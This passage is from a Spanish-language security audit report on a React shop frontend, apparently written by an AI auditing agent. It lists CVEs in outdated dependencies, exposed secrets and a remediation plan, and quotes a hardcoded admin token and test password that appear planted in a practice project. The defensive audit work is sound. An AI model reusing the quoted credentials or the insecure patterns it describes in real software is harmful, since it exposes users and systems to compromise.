- **Descripcion**: El proyecto usa Bootstrap 3.3.7 y jQuery 2.2.4. Si alguno de estos recursos se carga desde un CDN externo en el HTML de produccion (sin SRI), un atacante que comprometa el CDN podria servir versiones maliciosas de estas librerias. No se detecta uso de SRI en el codigo analizado.
- **Recomendacion**: Si se usan CDNs, incluir siempre el atributo `integrity` con el hash del recurso esperado.

---

### [INFO-004] FEATURE_FLAG_NEW_CHECKOUT expuesto en el bundle de produccion
- **Categoria**: A05:2021 - Security Misconfiguration / Information Disclosure
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 11)
- **Fragmento de codigo**:
  ```javascript
  var FEATURE_FLAG_NEW_CHECKOUT = false;
  ```
- **Descripcion**: Los feature flags hardcodeados en el bundle de produccion revelan informacion sobre la hoja de ruta del producto y funcionalidades en desarrollo. Un atacante con acceso al bundle podria identificar funcionalidades futuras y preparar ataques dirigidos. Los feature flags deben gestionarse mediante servicios dedicados (LaunchDarkly, Unleash) o variables de entorno.
- **Impacto**: Information disclosure sobre funcionalidades en desarrollo.

---

## Resultado de npm audit (basado en inspeccion de package-lock.json y CVEs documentados)

> NOTA: La tabla siguiente se basa en el analisis manual del `package-lock.json` y en la base de datos de CVEs publica. No fue posible ejecutar `npm audit --json` en este entorno. Los resultados pueden diferir ligeramente de los que produciria `npm audit` en cuanto a la clasificacion de dependencias directas vs transitivas.

| Paquete | Version Actual | Tipo | Severidad | CVE(s) | Descripcion | Version Segura |
|---------|---------------|------|-----------|--------|-------------|----------------|
| `axios` | 0.18.0 | Directa | CRITICO | - | SSRF critico, prototype pollution en headers. Marcado como deprecated en package-lock.json | >= 0.21.1 |
| `lodash` | 4.17.4 | Directa | ALTO | CVE-2019-10744, CVE-2018-16487 | Prototype pollution en merge/defaultsDeep/zipObjectDeep | >= 4.17.21 |
| `handlebars` | 4.0.11 | Directa | ALTO | CVE-2021-23369, CVE-2021-23383 | RCE y Prototype Pollution en template compiler | >= 4.7.7 |
| `marked` | 0.3.6 | Directa | ALTO | CVE-2022-21681, CVE-2022-21680, CVE-2017-16114 | XSS en parser Markdown, ReDoS | >= 4.0.10 |
| `jquery` | 2.2.4 | Directa | ALTO | CVE-2019-11358, CVE-2020-11022, CVE-2020-11023 | Prototype Pollution, XSS en $.html() | >= 3.5.0 |
| `node-fetch` | 1.7.3 | Directa | ALTO | CVE-2022-0235 | Exposicion de informacion via cabeceras HTTP | >= 2.6.7 |
| `serialize-javascript` | 1.4.0 | Directa | MEDIO | CVE-2019-16769 | XSS via Unicode no escapado en serializacion | >= 2.1.1 |
| `moment` | 2.19.1 | Directa | MEDIO | CVE-2022-24785, CVE-2017-18214 | ReDoS, Path Traversal en locales | >= 2.29.4 |
| `bootstrap` | 3.3.7 | Directa | BAJO | CVE-2016-10735, CVE-2018-14041 | XSS en data-target, tooltip | >= 3.4.1 o >= 4.3.1 |

---

## Plan de Remediacion Priorizado

### Accion Inmediata (0-24 horas) - CRITICO

1. **Eliminar el `adminToken` hardcodeado** de `handleBuy()` en `App.js` linea 173. Este token no debe existir en el frontend bajo ningun concepto.
2. **Eliminar `localStorage.setItem('userPassword', password)`** de `handleLogin()` en `App.js` linea 190. Las contraseñas NUNCA se almacenan en el cliente.
3. **Eliminar `testAdminPassword: 'SuperSecreto123!'`** del estado inicial del componente en `App.js` linea 39.
4. **Actualizar axios**: `npm install axios@latest` (actualmente 0.18.0 -> recomendado >=1.6.0). El propio package-lock.json ya advierte que es critico.
5. **Rotar inmediatamente** el `adminToken` del backend si el valor `admin-token-DO-NOT-SHARE-abc123xyz789` se usa en produccion, ya que ha sido comprometido al estar en el repositorio de git.

### Corto Plazo (1-2 semanas) - ALTO

6. **Instalar DOMPurify** y sanitizar todas las instancias de `dangerouslySetInnerHTML` en `ProductList.jsx`. Como minimo: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }}`. Para texto de usuarios (resenas), eliminar el uso de `dangerouslySetInnerHTML` completamente y usar interpolacion directa de React.
7. **Actualizar lodash** a >= 4.17.21: `npm install lodash@^4.17.21`
8. **Actualizar handlebars** a >= 4.7.7: `npm install handlebars@^4.7.7`
9. **Actualizar marked** a >= 4.0.10: `npm install marked@^4.0.10` (verificar cambios de API)
10. **Actualizar jquery** a >= 3.5.0: `npm install jquery@^3.5.0`
11. **Actualizar node-fetch** a >= 2.6.7: `npm install node-fetch@^2.6.7`
12. **Migrar la URL base de la API** a una variable de entorno: `process.env.REACT_APP_API_BASE_URL`
13. **Migrar la clave de Stripe** a `process.env.REACT_APP_STRIPE_PUBLIC_KEY` y eliminar su envio al backend.

### Mediano Plazo (1 mes) - MEDIO e INFORMATIVO

14. **Implementar Content Security Policy** en el servidor web o en el backend de Spring Boot.
15. **Actualizar serialize-javascript** a >= 2.1.1: `npm install serialize-javascript@^6.0.1`
16. **Actualizar moment** a >= 2.29.4 o migrar a `date-fns`/`luxon`.
17. **Actualizar bootstrap** a >= 4.x.
18. **Mover la logica de codigos de descuento** exclusivamente al backend.
19. **Eliminar `navigator.userAgent`** del payload de resenas.
20. **Reescribir los tests** con aserciones significativas que validen el comportamiento real, incluyendo tests de seguridad que verifiquen la sanitizacion de XSS.
21. **Implementar manejo de errores** con `.catch()` en todas las llamadas axios.
22. **Encapsular la URL base de API** en un servicio HTTP centralizado en lugar de duplicarla en multiples componentes.

---

## Archivos Analizados

| Archivo | Tipo | Estado |
|---------|------|--------|
| `frontend/package.json` | Dependencias y configuracion | Analizado completamente |
| `frontend/package-lock.json` | Lockfile de dependencias (versiones exactas) | Analizado (campos criticos) |
| `frontend/src/App.js` | Componente raiz de React | Analizado completamente |
| `frontend/src/components/ProductList.jsx` | Componente de lista de productos | Analizado completamente |
| `frontend/src/components/ProductList.test.js` | Suite de tests | Analizado completamente |
| `frontend/.env*` | Archivos de entorno | No encontrados (ninguno presente) |

**Archivos no encontrados / no accesibles:**
- `frontend/src/components/Cart.jsx` - Referenciado en App.js pero no existe en el directorio src/
- `frontend/src/components/Header.jsx` - Referenciado en App.js pero no existe en el directorio src/
- `frontend/public/index.html` - No analizado (no incluido en la busqueda inicial)

> ADVERTENCIA: Los componentes `Cart` y `Header` son referenciados en `App.js` pero no se encontraron en el sistema de archivos. Si existen en otra ubicacion o son generados dinamicamente, deben incluirse en una auditoria complementaria.

---

*Informe generado automaticamente por el Frontend DevSecOps Auditor Agent*
*Proyecto: La Taberna del Gato | Auditor: Senior DevSecOps Agent - Frontend Security Specialist*
*Metodologia: Analisis estatico de codigo fuente + Inspeccion de package-lock.json + Correlacion con base de datos CVE publica*
